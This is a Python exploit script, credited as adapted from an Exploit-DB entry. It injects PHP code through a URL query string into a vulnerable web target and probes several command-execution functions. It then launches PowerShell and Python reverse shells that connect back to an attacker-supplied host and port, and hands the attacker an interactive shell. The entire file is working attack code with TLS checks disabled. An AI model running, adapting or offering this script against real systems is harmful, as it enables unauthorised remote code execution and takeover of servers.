#!/usr/bin/python

# Author: Robin van den Hurk
#
# Inspiration has been taken from http://www.exploit-db.com/exploits/33030/
# Credits to the author

import random
import hashlib
import requests
import sys
import time
import socket
from base64 import b64encode
from multiprocessing.dummy import Pool

# Disable InsecureRequestWarming
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Define functions
def read_result(data, start, end):
    return data.split(start, 1)[1].split(end, 1)[0].rstrip()

def execute_command(function, cmd, async = False):
    global host
    global padding_start
    global padding_end

    if (len(cmd) % 3) > 0:
        padding = " " * (3 - len(cmd) % 3)
        cmd = cmd + padding

    url = "{0}?z);echo(base64_decode('{1}'));{2}(base64_decode('{3}'));echo(base64_decode('{4}')=/".format(host, b64encode(padding_start), function, b64encode(cmd), b64encode(padding_end))
    
    if (async):
        Pool(1).apply_async(requests.get, args=[url], kwds={'verify': False})
    else:
        r = requests.get(url, verify=False)
        return read_result(r.text, padding_start, padding_end)

def print_usage():
    print "Usage: python {0} <target> <lhost> <lport>".format(sys.argv[0])

def interact(sock):
    print "Reverse shell connected!"
    command = ''
    while(command != 'exit'):
        command = raw_input('')
        sock.send(command + '\n')
        time.sleep(.5)
        sys.stdout.write(sock.recv(0x10000))
    return

def close_socket():
    sock.close()


# Verify parameters
if len(sys.argv) < 4:
    print_usage()
    exit()


# Set global variables
host = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
working_function = None
padding_start = hashlib.md5(str(random.random())).hexdigest()[:15]
padding_end = hashlib.md5(str(random.random())).hexdigest()[:15]


# Find working function
for func in ["system", "passthru", "exec", "shell_exec"]:
    value = "HelloIAmVulnerable"
    result = execute_command(func, "echo {0}".format(value))

    if value in result:
        working_function = func
        break

if working_function is None:
    print "Target not vulnerable"
    sys.exit()


# Start remote shell
print("Target vulnerable!")
print("whoami: {}".format(execute_command(working_function, "whoami")))

# Start listener
sock = socket.socket()
sock.bind(('', int(lport)))
sock.listen(1)

# Send shell
rev_shell_powershell = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
rev_shell_python = "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('" + lhost + "'," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\""

execute_command(working_function, rev_shell_powershell, True)
execute_command(working_function, rev_shell_python, True)

try:
    interact(sock.accept()[0])
except socket.error:
    pass
finally:
    sock.close()